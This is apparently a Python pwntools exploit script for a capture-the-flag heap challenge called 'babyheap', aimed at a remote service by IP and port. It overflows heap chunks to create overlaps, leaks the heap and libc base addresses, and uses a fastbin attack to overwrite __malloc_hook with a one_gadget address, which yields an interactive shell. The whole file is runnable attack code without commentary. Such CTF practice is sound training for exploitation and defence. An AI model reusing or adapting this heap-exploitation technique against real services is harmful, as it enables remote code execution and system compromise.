from pwn import *

context.log_level = 'debug'

#sh=process('./babyheap')
sh = remote('111.198.29.45','31717')
elf = ELF('./babyheap')
libc = ELF('./libc-2.23.so')

def show(idx):
	sh.sendlineafter('>> ','3')
	sh.sendline(str(idx))

def new(length,con):
	sh.sendlineafter('>> ','1')
	sh.sendline(str(length))
	sh.send(con)

def edit(idx,length,con):
        sh.sendlineafter('>> ','2')
        sh.sendline(str(idx))
        sh.sendline(str(length))
	sh.send(con)

def dele(idx):
        sh.sendlineafter('>> ','4')
        sh.sendline(str(idx))


new(0x10,'a'*0x10)  #0
new(0x10,'b'*0x10)  #1
new(0x10,'c'*0x10)  #2
new(0x10,'d'*0x10)  #3
new(0x10,'e'*0x10)  #4

#--------------leak heap base----------------
edit(0,0x20,'a'*0x18+p64(0x41))
dele(1)
new(0x30,'b'*0x18+p64(0x21)+'c'*0x10)  #1
dele(4)
dele(2)
show(1)
sh.recvuntil(p64(0x21))
heap = u64(sh.recv(8))-0x80
print 'heap_base: '+hex(heap)
#--------------leak libc base----------------
new(0x10,'b'*0x10)  #2
new(0x10,'e'*0x10)  #4
new(0x10,'f'*0x10)  #5

new(0x10,'deadbeef'*2) #6
#new(0x90,'c'*0x90)

edit(0,0x28,'a'*0x18+p64(0xa1)+'a'*8)
#gdb.attach(sh)
dele(1)
new(0x10,'b'*0x10)  #1
#gdb.attach(sh)
show(2)
main_arena = u64(sh.recv(8))-88
malloc_hook = main_arena - 0x10
libc.base = malloc_hook - libc.symbols['__malloc_hook']
one_gadget = libc.base+0x4526a
print 'libc: '+hex(libc.base)
#------------hjack malloc_hook to getshell----------
new(0x70,'c'*0x60+p64(0)+p64(0x31))  #2 & 7
edit(1,0x28,'b'*0x18+p64(0x71)+'c'*8)
dele(7)
edit(2,8,p64(main_arena-0x33))
new(0x60,'c'*0x60)
new(0x63,'a'*0x13+p64(one_gadget)+p64(0)*9)
new(1,'a')


#gdb.attach(sh)

sh.interactive()
